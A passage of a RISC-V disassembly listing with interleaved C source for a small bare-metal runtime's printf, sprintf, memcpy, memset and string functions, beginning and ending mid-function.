        width = precision, precision = -1;
    8000201c:	fc842783          	lw	a5,-56(s0)
    80002020:	fcf42623          	sw	a5,-52(s0)
    80002024:	57fd                	li	a5,-1
    80002026:	fcf42423          	sw	a5,-56(s0)
      goto reswitch;
    8000202a:	b739                	j	80001f38 <vprintfmt+0x7c>

    // long flag (doubled for long long)
    case 'l':
      lflag++;
    8000202c:	fd042783          	lw	a5,-48(s0)
    80002030:	2785                	addiw	a5,a5,1
    80002032:	fcf42823          	sw	a5,-48(s0)
      goto reswitch;
    80002036:	b709                	j	80001f38 <vprintfmt+0x7c>

    // character
    case 'c':
      putch(va_arg(ap, int), putdat);
    80002038:	f9043783          	ld	a5,-112(s0)
    8000203c:	00878713          	addi	a4,a5,8
    80002040:	f8e43823          	sd	a4,-112(s0)
    80002044:	439c                	lw	a5,0(a5)
    80002046:	fa843703          	ld	a4,-88(s0)
    8000204a:	fa043583          	ld	a1,-96(s0)
    8000204e:	853e                	mv	a0,a5
    80002050:	9702                	jalr	a4
      break;
    80002052:	aa65                	j	8000220a <vprintfmt+0x34e>

    // string
    case 's':
      if ((p = va_arg(ap, char *)) == NULL)
    80002054:	f9043783          	ld	a5,-112(s0)
    80002058:	00878713          	addi	a4,a5,8
    8000205c:	f8e43823          	sd	a4,-112(s0)
    80002060:	0007b903          	ld	s2,0(a5)
    80002064:	00091663          	bnez	s2,80002070 <vprintfmt+0x1b4>
        p = "(null)";
    80002068:	00001917          	auipc	s2,0x1
    8000206c:	87090913          	addi	s2,s2,-1936 # 800028d8 <atol+0x296>
      if (width > 0 && padc != '-')
    80002070:	fcc42783          	lw	a5,-52(s0)
    80002074:	2781                	sext.w	a5,a5
    80002076:	06f05a63          	blez	a5,800020ea <vprintfmt+0x22e>
    8000207a:	fc744783          	lbu	a5,-57(s0)
    8000207e:	0ff7f713          	andi	a4,a5,255
    80002082:	02d00793          	li	a5,45
    80002086:	06f70263          	beq	a4,a5,800020ea <vprintfmt+0x22e>
        for (width -= strnlen(p, precision); width > 0; width--)
    8000208a:	fcc42483          	lw	s1,-52(s0)
    8000208e:	fc842783          	lw	a5,-56(s0)
    80002092:	85be                	mv	a1,a5
    80002094:	854a                	mv	a0,s2
    80002096:	4a4000ef          	jal	ra,8000253a <strnlen>
    8000209a:	87aa                	mv	a5,a0
    8000209c:	2781                	sext.w	a5,a5
    8000209e:	40f487bb          	subw	a5,s1,a5
    800020a2:	2781                	sext.w	a5,a5
    800020a4:	fcf42623          	sw	a5,-52(s0)
    800020a8:	a839                	j	800020c6 <vprintfmt+0x20a>
          putch(padc, putdat);
    800020aa:	fc744783          	lbu	a5,-57(s0)
    800020ae:	2781                	sext.w	a5,a5
    800020b0:	fa843703          	ld	a4,-88(s0)
    800020b4:	fa043583          	ld	a1,-96(s0)
    800020b8:	853e                	mv	a0,a5
    800020ba:	9702                	jalr	a4
        for (width -= strnlen(p, precision); width > 0; width--)
    800020bc:	fcc42783          	lw	a5,-52(s0)
    800020c0:	37fd                	addiw	a5,a5,-1
    800020c2:	fcf42623          	sw	a5,-52(s0)
    800020c6:	fcc42783          	lw	a5,-52(s0)
    800020ca:	2781                	sext.w	a5,a5
    800020cc:	fcf04fe3          	bgtz	a5,800020aa <vprintfmt+0x1ee>
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800020d0:	a829                	j	800020ea <vprintfmt+0x22e>
        putch(ch, putdat);
    800020d2:	fa843783          	ld	a5,-88(s0)
    800020d6:	fa043583          	ld	a1,-96(s0)
    800020da:	8526                	mv	a0,s1
    800020dc:	9782                	jalr	a5
        p++;
    800020de:	0905                	addi	s2,s2,1
      for (; (ch = *p) != '\0' && (precision < 0 || --precision >= 0); width--) {
    800020e0:	fcc42783          	lw	a5,-52(s0)
    800020e4:	37fd                	addiw	a5,a5,-1
    800020e6:	fcf42623          	sw	a5,-52(s0)
    800020ea:	00094783          	lbu	a5,0(s2)
    800020ee:	0007849b          	sext.w	s1,a5
    800020f2:	cc8d                	beqz	s1,8000212c <vprintfmt+0x270>
    800020f4:	fc842783          	lw	a5,-56(s0)
    800020f8:	2781                	sext.w	a5,a5
    800020fa:	fc07cce3          	bltz	a5,800020d2 <vprintfmt+0x216>
    800020fe:	fc842783          	lw	a5,-56(s0)
    80002102:	37fd                	addiw	a5,a5,-1
    80002104:	fcf42423          	sw	a5,-56(s0)
    80002108:	fc842783          	lw	a5,-56(s0)
    8000210c:	2781                	sext.w	a5,a5
    8000210e:	fc07d2e3          	bgez	a5,800020d2 <vprintfmt+0x216>
      }
      for (; width > 0; width--)
    80002112:	a829                	j	8000212c <vprintfmt+0x270>
        putch(' ', putdat);
    80002114:	fa843783          	ld	a5,-88(s0)
    80002118:	fa043583          	ld	a1,-96(s0)
    8000211c:	02000513          	li	a0,32
    80002120:	9782                	jalr	a5
      for (; width > 0; width--)
    80002122:	fcc42783          	lw	a5,-52(s0)
    80002126:	37fd                	addiw	a5,a5,-1
    80002128:	fcf42623          	sw	a5,-52(s0)
    8000212c:	fcc42783          	lw	a5,-52(s0)
    80002130:	2781                	sext.w	a5,a5
    80002132:	fef041e3          	bgtz	a5,80002114 <vprintfmt+0x258>
      break;
    80002136:	a8d1                	j	8000220a <vprintfmt+0x34e>

    // (signed) decimal
    case 'd':
      num = getint(&ap, lflag);
    80002138:	fd042703          	lw	a4,-48(s0)
    8000213c:	f9040793          	addi	a5,s0,-112
    80002140:	85ba                	mv	a1,a4
    80002142:	853e                	mv	a0,a5
    80002144:	d11ff0ef          	jal	ra,80001e54 <getint>
    80002148:	87aa                	mv	a5,a0
    8000214a:	fcf43c23          	sd	a5,-40(s0)
      if ((long long) num < 0) {
    8000214e:	fd843783          	ld	a5,-40(s0)
    80002152:	0007df63          	bgez	a5,80002170 <vprintfmt+0x2b4>
        putch('-', putdat);
    80002156:	fa843783          	ld	a5,-88(s0)
    8000215a:	fa043583          	ld	a1,-96(s0)
    8000215e:	02d00513          	li	a0,45
    80002162:	9782                	jalr	a5
        num = -(long long) num;
    80002164:	fd843783          	ld	a5,-40(s0)
    80002168:	40f007b3          	neg	a5,a5
    8000216c:	fcf43c23          	sd	a5,-40(s0)
      }
      base = 10;
    80002170:	47a9                	li	a5,10
    80002172:	fcf42a23          	sw	a5,-44(s0)
      goto signed_number;
    80002176:	a0b9                	j	800021c4 <vprintfmt+0x308>

    // unsigned decimal
    case 'u':
      base = 10;
    80002178:	47a9                	li	a5,10
    8000217a:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    8000217e:	a80d                	j	800021b0 <vprintfmt+0x2f4>

    // (unsigned) octal
    case 'o':
      // should do something with padding so it's always 3 octits
      base = 8;
    80002180:	47a1                	li	a5,8
    80002182:	fcf42a23          	sw	a5,-44(s0)
      goto unsigned_number;
    80002186:	a02d                	j	800021b0 <vprintfmt+0x2f4>

    // pointer
    case 'p':
      static_assert(sizeof(long) == sizeof(void*));
      lflag = 1;
    80002188:	4785                	li	a5,1
    8000218a:	fcf42823          	sw	a5,-48(s0)
      putch('0', putdat);
    8000218e:	fa843783          	ld	a5,-88(s0)
    80002192:	fa043583          	ld	a1,-96(s0)
    80002196:	03000513          	li	a0,48
    8000219a:	9782                	jalr	a5
      putch('x', putdat);
    8000219c:	fa843783          	ld	a5,-88(s0)
    800021a0:	fa043583          	ld	a1,-96(s0)
    800021a4:	07800513          	li	a0,120
    800021a8:	9782                	jalr	a5
      /* fall through to 'x' */

    // (unsigned) hexadecimal
    case 'x':
      base = 16;
    800021aa:	47c1                	li	a5,16
    800021ac:	fcf42a23          	sw	a5,-44(s0)
    unsigned_number:
      num = getuint(&ap, lflag);
    800021b0:	fd042703          	lw	a4,-48(s0)
    800021b4:	f9040793          	addi	a5,s0,-112
    800021b8:	85ba                	mv	a1,a4
    800021ba:	853e                	mv	a0,a5
    800021bc:	c2dff0ef          	jal	ra,80001de8 <getuint>
    800021c0:	fca43c23          	sd	a0,-40(s0)
    signed_number:
      printnum(putch, putdat, num, base, width, padc);
    800021c4:	fd442683          	lw	a3,-44(s0)
    800021c8:	fc744783          	lbu	a5,-57(s0)
    800021cc:	2781                	sext.w	a5,a5
    800021ce:	fcc42703          	lw	a4,-52(s0)
    800021d2:	fd843603          	ld	a2,-40(s0)
    800021d6:	fa043583          	ld	a1,-96(s0)
    800021da:	fa843503          	ld	a0,-88(s0)
    800021de:	b09ff0ef          	jal	ra,80001ce6 <printnum>
      break;
    800021e2:	a025                	j	8000220a <vprintfmt+0x34e>

    // escaped '%' character
    case '%':
      putch(ch, putdat);
    800021e4:	fa843783          	ld	a5,-88(s0)
    800021e8:	fa043583          	ld	a1,-96(s0)
    800021ec:	8526                	mv	a0,s1
    800021ee:	9782                	jalr	a5
      break;
    800021f0:	a829                	j	8000220a <vprintfmt+0x34e>
      
    // unrecognized escape sequence - just print it literally
    default:
      putch('%', putdat);
    800021f2:	fa843783          	ld	a5,-88(s0)
    800021f6:	fa043583          	ld	a1,-96(s0)
    800021fa:	02500513          	li	a0,37
    800021fe:	9782                	jalr	a5
      fmt = last_fmt;
    80002200:	fb843783          	ld	a5,-72(s0)
    80002204:	f8f43c23          	sd	a5,-104(s0)
      break;
    80002208:	0001                	nop
    while ((ch = *(unsigned char *) fmt) != '%') {
    8000220a:	b1ed                	j	80001ef4 <vprintfmt+0x38>
        return;
    8000220c:	0001                	nop
    }
  }
}
    8000220e:	70a6                	ld	ra,104(sp)
    80002210:	7406                	ld	s0,96(sp)
    80002212:	64e6                	ld	s1,88(sp)
    80002214:	6946                	ld	s2,80(sp)
    80002216:	6165                	addi	sp,sp,112
    80002218:	8082                	ret

000000008000221a <printf>:

int printf(const char* fmt, ...)
{
    8000221a:	7159                	addi	sp,sp,-112
    8000221c:	f406                	sd	ra,40(sp)
    8000221e:	f022                	sd	s0,32(sp)
    80002220:	1800                	addi	s0,sp,48
    80002222:	fca43c23          	sd	a0,-40(s0)
    80002226:	e40c                	sd	a1,8(s0)
    80002228:	e810                	sd	a2,16(s0)
    8000222a:	ec14                	sd	a3,24(s0)
    8000222c:	f018                	sd	a4,32(s0)
    8000222e:	f41c                	sd	a5,40(s0)
    80002230:	03043823          	sd	a6,48(s0)
    80002234:	03143c23          	sd	a7,56(s0)
  va_list ap;
  va_start(ap, fmt);
    80002238:	04040793          	addi	a5,s0,64
    8000223c:	fcf43823          	sd	a5,-48(s0)
    80002240:	fd043783          	ld	a5,-48(s0)
    80002244:	fc878793          	addi	a5,a5,-56
    80002248:	fef43423          	sd	a5,-24(s0)

  vprintfmt((void*)putchar, 0, fmt, ap);
    8000224c:	fe843783          	ld	a5,-24(s0)
    80002250:	86be                	mv	a3,a5
    80002252:	fd843603          	ld	a2,-40(s0)
    80002256:	4581                	li	a1,0
    80002258:	00000517          	auipc	a0,0x0
    8000225c:	98e50513          	addi	a0,a0,-1650 # 80001be6 <putchar>
    80002260:	c5dff0ef          	jal	ra,80001ebc <vprintfmt>

  va_end(ap);
  return 0; // incorrect return value, but who cares, anyway?
    80002264:	4781                	li	a5,0
}
    80002266:	853e                	mv	a0,a5
    80002268:	70a2                	ld	ra,40(sp)
    8000226a:	7402                	ld	s0,32(sp)
    8000226c:	6165                	addi	sp,sp,112
    8000226e:	8082                	ret

0000000080002270 <sprintf_putch.3105>:
  va_list ap;
  char* str0 = str;
  va_start(ap, fmt);

  void sprintf_putch(int ch, void** data)
  {
    80002270:	7139                	addi	sp,sp,-64
    80002272:	fc22                	sd	s0,56(sp)
    80002274:	0080                	addi	s0,sp,64
    80002276:	87aa                	mv	a5,a0
    80002278:	fcb43823          	sd	a1,-48(s0)
    8000227c:	fcf42e23          	sw	a5,-36(s0)
    80002280:	fc743423          	sd	t2,-56(s0)
    char** pstr = (char**)data;
    80002284:	fd043783          	ld	a5,-48(s0)
    80002288:	fef43423          	sd	a5,-24(s0)
    **pstr = ch;
    8000228c:	fe843783          	ld	a5,-24(s0)
    80002290:	639c                	ld	a5,0(a5)
    80002292:	fdc42703          	lw	a4,-36(s0)
    80002296:	0ff77713          	andi	a4,a4,255
    8000229a:	00e78023          	sb	a4,0(a5)
    (*pstr)++;
    8000229e:	fe843783          	ld	a5,-24(s0)
    800022a2:	639c                	ld	a5,0(a5)
    800022a4:	00178713          	addi	a4,a5,1
    800022a8:	fe843783          	ld	a5,-24(s0)
    800022ac:	e398                	sd	a4,0(a5)
  }
    800022ae:	0001                	nop
    800022b0:	7462                	ld	s0,56(sp)
    800022b2:	6121                	addi	sp,sp,64
    800022b4:	8082                	ret

00000000800022b6 <sprintf>:
{
    800022b6:	716d                	addi	sp,sp,-272
    800022b8:	ed86                	sd	ra,216(sp)
    800022ba:	e9a2                	sd	s0,208(sp)
    800022bc:	1180                	addi	s0,sp,224
    800022be:	f2a43c23          	sd	a0,-200(s0)
    800022c2:	f2b43823          	sd	a1,-208(s0)
    800022c6:	e010                	sd	a2,0(s0)
    800022c8:	e414                	sd	a3,8(s0)
    800022ca:	e818                	sd	a4,16(s0)
    800022cc:	ec1c                	sd	a5,24(s0)
    800022ce:	03043023          	sd	a6,32(s0)
    800022d2:	03143423          	sd	a7,40(s0)
int	feof (FILE *);
int	ferror (FILE *);
void    perror (const char *);
#ifndef _REENT_ONLY
FILE *	fopen (const char *__restrict _name, const char *__restrict _type);
int	sprintf (char *__restrict, const char *__restrict, ...)
    800022d6:	03040793          	addi	a5,s0,48
    800022da:	f2f43423          	sd	a5,-216(s0)
    800022de:	f2843783          	ld	a5,-216(s0)
    800022e2:	fcf43c23          	sd	a5,-40(s0)
    800022e6:	f4840793          	addi	a5,s0,-184
    800022ea:	f4840713          	addi	a4,s0,-184
    800022ee:	39700693          	li	a3,919
    800022f2:	c394                	sw	a3,0(a5)
    800022f4:	0183b6b7          	lui	a3,0x183b
    800022f8:	30368693          	addi	a3,a3,771 # 183b303 <_tbss_end+0x183b27f>
    800022fc:	c3d4                	sw	a3,4(a5)
    800022fe:	0103b6b7          	lui	a3,0x103b
    80002302:	38368693          	addi	a3,a3,899 # 103b383 <_tbss_end+0x103b2ff>
    80002306:	c794                	sw	a3,8(a5)
    80002308:	000306b7          	lui	a3,0x30
    8000230c:	06768693          	addi	a3,a3,103 # 30067 <_tbss_end+0x2ffe3>
    80002310:	c7d4                	sw	a3,12(a5)
    80002312:	eb98                	sd	a4,16(a5)
    80002314:	00000717          	auipc	a4,0x0
    80002318:	f5c70713          	addi	a4,a4,-164 # 80002270 <sprintf_putch.3105>
    8000231c:	ef98                	sd	a4,24(a5)
    8000231e:	0000100f          	fence.i
  char* str0 = str;
    80002322:	f3843783          	ld	a5,-200(s0)
    80002326:	fef43423          	sd	a5,-24(s0)
  va_start(ap, fmt);
    8000232a:	03040793          	addi	a5,s0,48
    8000232e:	f2f43423          	sd	a5,-216(s0)
    80002332:	f2843783          	ld	a5,-216(s0)
    80002336:	fd078793          	addi	a5,a5,-48
    8000233a:	fef43023          	sd	a5,-32(s0)

  vprintfmt(sprintf_putch, (void**)&str, fmt, ap);
    8000233e:	fe043703          	ld	a4,-32(s0)
    80002342:	f4840793          	addi	a5,s0,-184
    80002346:	853e                	mv	a0,a5
    80002348:	f3840793          	addi	a5,s0,-200
    8000234c:	86ba                	mv	a3,a4
    8000234e:	f3043603          	ld	a2,-208(s0)
    80002352:	85be                	mv	a1,a5
    80002354:	b69ff0ef          	jal	ra,80001ebc <vprintfmt>
  *str = 0;
    80002358:	f3843783          	ld	a5,-200(s0)
    8000235c:	00078023          	sb	zero,0(a5)

  va_end(ap);
  return str - str0;
    80002360:	f3843703          	ld	a4,-200(s0)
    80002364:	fe843783          	ld	a5,-24(s0)
    80002368:	40f707b3          	sub	a5,a4,a5
    8000236c:	2781                	sext.w	a5,a5
}
    8000236e:	853e                	mv	a0,a5
    80002370:	60ee                	ld	ra,216(sp)
    80002372:	644e                	ld	s0,208(sp)
    80002374:	6151                	addi	sp,sp,272
    80002376:	8082                	ret

0000000080002378 <memcpy>:

void* memcpy(void* dest, const void* src, size_t len)
{
    80002378:	715d                	addi	sp,sp,-80
    8000237a:	e4a2                	sd	s0,72(sp)
    8000237c:	0880                	addi	s0,sp,80
    8000237e:	fca43423          	sd	a0,-56(s0)
    80002382:	fcb43023          	sd	a1,-64(s0)
    80002386:	fac43c23          	sd	a2,-72(s0)
  if ((((uintptr_t)dest | (uintptr_t)src | len) & (sizeof(uintptr_t)-1)) == 0) {
    8000238a:	fc843703          	ld	a4,-56(s0)
    8000238e:	fc043783          	ld	a5,-64(s0)
    80002392:	8f5d                	or	a4,a4,a5
    80002394:	fb843783          	ld	a5,-72(s0)
    80002398:	8fd9                	or	a5,a5,a4
    8000239a:	8b9d                	andi	a5,a5,7
    8000239c:	e3b1                	bnez	a5,800023e0 <memcpy+0x68>
    const uintptr_t* s = src;
    8000239e:	fc043783          	ld	a5,-64(s0)
    800023a2:	fef43423          	sd	a5,-24(s0)
    uintptr_t *d = dest;
    800023a6:	fc843783          	ld	a5,-56(s0)
    800023aa:	fef43023          	sd	a5,-32(s0)
    while (d < (uintptr_t*)(dest + len))
    800023ae:	a839                	j	800023cc <memcpy+0x54>
      *d++ = *s++;
    800023b0:	fe843703          	ld	a4,-24(s0)
    800023b4:	00870793          	addi	a5,a4,8
    800023b8:	fef43423          	sd	a5,-24(s0)
    800023bc:	fe043783          	ld	a5,-32(s0)
    800023c0:	00878693          	addi	a3,a5,8
    800023c4:	fed43023          	sd	a3,-32(s0)
    800023c8:	6318                	ld	a4,0(a4)
    800023ca:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    800023cc:	fc843703          	ld	a4,-56(s0)
    800023d0:	fb843783          	ld	a5,-72(s0)
    800023d4:	97ba                	add	a5,a5,a4
    800023d6:	fe043703          	ld	a4,-32(s0)
    800023da:	fcf76be3          	bltu	a4,a5,800023b0 <memcpy+0x38>
    800023de:	a099                	j	80002424 <memcpy+0xac>
  } else {
    const char* s = src;
    800023e0:	fc043783          	ld	a5,-64(s0)
    800023e4:	fcf43c23          	sd	a5,-40(s0)
    char *d = dest;
    800023e8:	fc843783          	ld	a5,-56(s0)
    800023ec:	fcf43823          	sd	a5,-48(s0)
    while (d < (char*)(dest + len))
    800023f0:	a00d                	j	80002412 <memcpy+0x9a>
      *d++ = *s++;
    800023f2:	fd843703          	ld	a4,-40(s0)
    800023f6:	00170793          	addi	a5,a4,1
    800023fa:	fcf43c23          	sd	a5,-40(s0)
    800023fe:	fd043783          	ld	a5,-48(s0)
    80002402:	00178693          	addi	a3,a5,1
    80002406:	fcd43823          	sd	a3,-48(s0)
    8000240a:	00074703          	lbu	a4,0(a4)
    8000240e:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    80002412:	fc843703          	ld	a4,-56(s0)
    80002416:	fb843783          	ld	a5,-72(s0)
    8000241a:	97ba                	add	a5,a5,a4
    8000241c:	fd043703          	ld	a4,-48(s0)
    80002420:	fcf769e3          	bltu	a4,a5,800023f2 <memcpy+0x7a>
  }
  return dest;
    80002424:	fc843783          	ld	a5,-56(s0)
}
    80002428:	853e                	mv	a0,a5
    8000242a:	6426                	ld	s0,72(sp)
    8000242c:	6161                	addi	sp,sp,80
    8000242e:	8082                	ret

0000000080002430 <memset>:

void* memset(void* dest, int byte, size_t len)
{
    80002430:	715d                	addi	sp,sp,-80
    80002432:	e4a2                	sd	s0,72(sp)
    80002434:	0880                	addi	s0,sp,80
    80002436:	fca43423          	sd	a0,-56(s0)
    8000243a:	87ae                	mv	a5,a1
    8000243c:	fac43c23          	sd	a2,-72(s0)
    80002440:	fcf42223          	sw	a5,-60(s0)
  if ((((uintptr_t)dest | len) & (sizeof(uintptr_t)-1)) == 0) {
    80002444:	fc843703          	ld	a4,-56(s0)
    80002448:	fb843783          	ld	a5,-72(s0)
    8000244c:	8fd9                	or	a5,a5,a4
    8000244e:	8b9d                	andi	a5,a5,7
    80002450:	e7bd                	bnez	a5,800024be <memset+0x8e>
    uintptr_t word = byte & 0xFF;
    80002452:	fc442783          	lw	a5,-60(s0)
    80002456:	0ff7f793          	andi	a5,a5,255
    8000245a:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 8;
    8000245e:	fd843783          	ld	a5,-40(s0)
    80002462:	07a2                	slli	a5,a5,0x8
    80002464:	fd843703          	ld	a4,-40(s0)
    80002468:	8fd9                	or	a5,a5,a4
    8000246a:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16;
    8000246e:	fd843783          	ld	a5,-40(s0)
    80002472:	07c2                	slli	a5,a5,0x10
    80002474:	fd843703          	ld	a4,-40(s0)
    80002478:	8fd9                	or	a5,a5,a4
    8000247a:	fcf43c23          	sd	a5,-40(s0)
    word |= word << 16 << 16;
    8000247e:	fd843783          	ld	a5,-40(s0)
    80002482:	1782                	slli	a5,a5,0x20
    80002484:	fd843703          	ld	a4,-40(s0)
    80002488:	8fd9                	or	a5,a5,a4
    8000248a:	fcf43c23          	sd	a5,-40(s0)

    uintptr_t *d = dest;
    8000248e:	fc843783          	ld	a5,-56(s0)
    80002492:	fef43423          	sd	a5,-24(s0)
    while (d < (uintptr_t*)(dest + len))
    80002496:	a811                	j	800024aa <memset+0x7a>
      *d++ = word;
    80002498:	fe843783          	ld	a5,-24(s0)
    8000249c:	00878713          	addi	a4,a5,8
    800024a0:	fee43423          	sd	a4,-24(s0)
    800024a4:	fd843703          	ld	a4,-40(s0)
    800024a8:	e398                	sd	a4,0(a5)
    while (d < (uintptr_t*)(dest + len))
    800024aa:	fc843703          	ld	a4,-56(s0)
    800024ae:	fb843783          	ld	a5,-72(s0)
    800024b2:	97ba                	add	a5,a5,a4
    800024b4:	fe843703          	ld	a4,-24(s0)
    800024b8:	fef760e3          	bltu	a4,a5,80002498 <memset+0x68>
    800024bc:	a81d                	j	800024f2 <memset+0xc2>
  } else {
    char *d = dest;
    800024be:	fc843783          	ld	a5,-56(s0)
    800024c2:	fef43023          	sd	a5,-32(s0)
    while (d < (char*)(dest + len))
    800024c6:	a829                	j	800024e0 <memset+0xb0>
      *d++ = byte;
    800024c8:	fe043783          	ld	a5,-32(s0)
    800024cc:	00178713          	addi	a4,a5,1
    800024d0:	fee43023          	sd	a4,-32(s0)
    800024d4:	fc442703          	lw	a4,-60(s0)
    800024d8:	0ff77713          	andi	a4,a4,255
    800024dc:	00e78023          	sb	a4,0(a5)
    while (d < (char*)(dest + len))
    800024e0:	fc843703          	ld	a4,-56(s0)
    800024e4:	fb843783          	ld	a5,-72(s0)
    800024e8:	97ba                	add	a5,a5,a4
    800024ea:	fe043703          	ld	a4,-32(s0)
    800024ee:	fcf76de3          	bltu	a4,a5,800024c8 <memset+0x98>
  }
  return dest;
    800024f2:	fc843783          	ld	a5,-56(s0)
}
    800024f6:	853e                	mv	a0,a5
    800024f8:	6426                	ld	s0,72(sp)
    800024fa:	6161                	addi	sp,sp,80
    800024fc:	8082                	ret

00000000800024fe <strlen>:

size_t strlen(const char *s)
{
    800024fe:	7179                	addi	sp,sp,-48
    80002500:	f422                	sd	s0,40(sp)
    80002502:	1800                	addi	s0,sp,48
    80002504:	fca43c23          	sd	a0,-40(s0)
  const char *p = s;
    80002508:	fd843783          	ld	a5,-40(s0)
    8000250c:	fef43423          	sd	a5,-24(s0)
  while (*p)
    80002510:	a031                	j	8000251c <strlen+0x1e>
    p++;
    80002512:	fe843783          	ld	a5,-24(s0)
    80002516:	0785                	addi	a5,a5,1
    80002518:	fef43423          	sd	a5,-24(s0)
  while (*p)
    8000251c:	fe843783          	ld	a5,-24(s0)
    80002520:	0007c783          	lbu	a5,0(a5)
    80002524:	f7fd                	bnez	a5,80002512 <strlen+0x14>
  return p - s;
    80002526:	fe843703          	ld	a4,-24(s0)
    8000252a:	fd843783          	ld	a5,-40(s0)
    8000252e:	40f707b3          	sub	a5,a4,a5
}
    80002532:	853e                	mv	a0,a5
    80002534:	7422                	ld	s0,40(sp)
    80002536:	6145                	addi	sp,sp,48
    80002538:	8082                	ret

000000008000253a <strnlen>:

size_t strnlen(const char *s, size_t n)
{
    8000253a:	7179                	addi	sp,sp,-48
    8000253c:	f422                	sd	s0,40(sp)
    8000253e:	1800                	addi	s0,sp,48
    80002540:	fca43c23          	sd	a0,-40(s0)
    80002544:	fcb43823          	sd	a1,-48(s0)
  const char *p = s;
    80002548:	fd843783          	ld	a5,-40(s0)
    8000254c:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    80002550:	a031                	j	8000255c <strnlen+0x22>
    p++;
    80002552:	fe843783          	ld	a5,-24(s0)
    80002556:	0785                	addi	a5,a5,1
    80002558:	fef43423          	sd	a5,-24(s0)
  while (n-- && *p)
    8000255c:	fd043783          	ld	a5,-48(s0)
    80002560:	fff78713          	addi	a4,a5,-1
    80002564:	fce43823          	sd	a4,-48(s0)
    80002568:	c791                	beqz	a5,80002574 <strnlen+0x3a>
    8000256a:	fe843783          	ld	a5,-24(s0)
    8000256e:	0007c783          	lbu	a5,0(a5)
    80002572:	f3e5                	bnez	a5,80002552 <strnlen+0x18>
  return p - s;
    80002574:	fe843703          	ld	a4,-24(s0)
    80002578:	fd843783          	ld	a5,-40(s0)
    8000257c:	40f707b3          	sub	a5,a4,a5
}
    80002580:	853e                	mv	a0,a5
    80002582:	7422                	ld	s0,40(sp)
    80002584:	6145                	addi	sp,sp,48
    80002586:	8082                	ret

0000000080002588 <strcmp>:

int strcmp(const char* s1, const char* s2)
{
    80002588:	7179                	addi	sp,sp,-48
    8000258a:	f422                	sd	s0,40(sp)
    8000258c:	1800                	addi	s0,sp,48
    8000258e:	fca43c23          	sd	a0,-40(s0)
    80002592:	fcb43823          	sd	a1,-48(s0)
  unsigned char c1, c2;

  do {
    c1 = *s1++;
    80002596:	fd843783          	ld	a5,-40(s0)
    8000259a:	00178713          	addi	a4,a5,1
    8000259e:	fce43c23          	sd	a4,-40(s0)
    800025a2:	0007c783          	lbu	a5,0(a5)
    800025a6:	fef407a3          	sb	a5,-17(s0)
    c2 = *s2++;
    800025aa:	fd043783          	ld	a5,-48(s0)
    800025ae:	00178713          	addi	a4,a5,1
    800025b2:	fce43823          	sd	a4,-48(s0)
    800025b6:	0007c783          	lbu	a5,0(a5)
    800025ba:	fef40723          	sb	a5,-18(s0)
  } while (c1 != 0 && c1 == c2);
    800025be:	fef44783          	lbu	a5,-17(s0)
    800025c2:	0ff7f793          	andi	a5,a5,255
    800025c6:	cb99                	beqz	a5,800025dc <strcmp+0x54>
    800025c8:	fef44703          	lbu	a4,-17(s0)
    800025cc:	fee44783          	lbu	a5,-18(s0)
    800025d0:	0ff77713          	andi	a4,a4,255
    800025d4:	0ff7f793          	andi	a5,a5,255
    800025d8:	faf70fe3          	beq	a4,a5,80002596 <strcmp+0xe>

  return c1 - c2;
    800025dc:	fef44783          	lbu	a5,-17(s0)
    800025e0:	0007871b          	sext.w	a4,a5
    800025e4:	fee44783          	lbu	a5,-18(s0)
    800025e8:	2781                	sext.w	a5,a5
    800025ea:	40f707bb          	subw	a5,a4,a5
    800025ee:	2781                	sext.w	a5,a5
}
    800025f0:	853e                	mv	a0,a5
    800025f2:	7422                	ld	s0,40(sp)
    800025f4:	6145                	addi	sp,sp,48
    800025f6:	8082                	ret

00000000800025f8 <strcpy>:

char* strcpy(char* dest, const char* src)
{
    800025f8:	7179                	addi	sp,sp,-48
    800025fa:	f422                	sd	s0,40(sp)
    800025fc:	1800                	addi	s0,sp,48
    800025fe:	fca43c23          	sd	a0,-40(s0)
    80002602:	fcb43823          	sd	a1,-48(s0)
  char* d = dest;
    80002606:	fd843783          	ld	a5,-40(s0)
    8000260a:	fef43423          	sd	a5,-24(s0)
  while ((*d++ = *src++))
    8000260e:	0001                	nop
    80002610:	fd043703          	ld	a4,-48(s0)
    80002614:	00170793          	addi	a5,a4,1
    80002618:	fcf43823          	sd	a5,-48(s0)
    8000261c:	fe843783          	ld	a5,-24(s0)
    80002620:	00178693          	addi	a3,a5,1
    80002624:	fed43423          	sd	a3,-24(s0)
    80002628:	00074703          	lbu	a4,0(a4)
    8000262c:	00e78023          	sb	a4,0(a5)
    80002630:	0007c783          	lbu	a5,0(a5)
    80002634:	fff1                	bnez	a5,80002610 <strcpy+0x18>
    ;
  return dest;
    80002636:	fd843783          	ld	a5,-40(s0)
}
    8000263a:	853e                	mv	a0,a5
    8000263c:	7422                	ld	s0,40(sp)
    8000263e:	6145                	addi	sp,sp,48
    80002640:	8082                	ret

0000000080002642 <atol>:

long atol(const char* str)
{
    80002642:	7179                	addi	sp,sp,-48
    80002644:	f422                	sd	s0,40(sp)
    80002646:	1800                	addi	s0,sp,48
    80002648:	fca43c23          	sd	a0,-40(s0)
  long res = 0;
    8000264c:	fe043423          	sd	zero,-24(s0)
  int sign = 0;
    80002650:	fe042223          	sw	zero,-28(s0)

  while (*str == ' ')
    80002654:	a031                	j	80002660 <atol+0x1e>
    str++;
    80002656:	fd843783          	ld	a5,-40(s0)
    8000265a:	0785                	addi	a5,a5,1
    8000265c:	fcf43c23          	sd	a5,-40(s0)
  while (*str == ' ')
    80002660:	fd843783          	ld	a5,-40(s0)
    80002664:	0007c783          	lbu	a5,0(a5)
    80002668:	873e                	mv	a4,a5
    8000266a:	02000793          	li	a5,32
    8000266e:	fef704e3          	beq	a4,a5,80002656 <atol+0x14>

  if (*str == '-' || *str == '+') {
    80002672:	fd843783          	ld	a5,-40(s0)
    80002676:	0007c783          	lbu	a5,0(a5)
    8000267a:	873e                	mv	a4,a5
    8000267c:	02d00793          	li	a5,45
    80002680:	00f70b63          	beq	a4,a5,80002696 <atol+0x54>
    80002684:	fd843783          	ld	a5,-40(s0)
    80002688:	0007c783          	lbu	a5,0(a5)
    8000268c:	873e                	mv	a4,a5
    8000268e:	02b00793          	li	a5,43
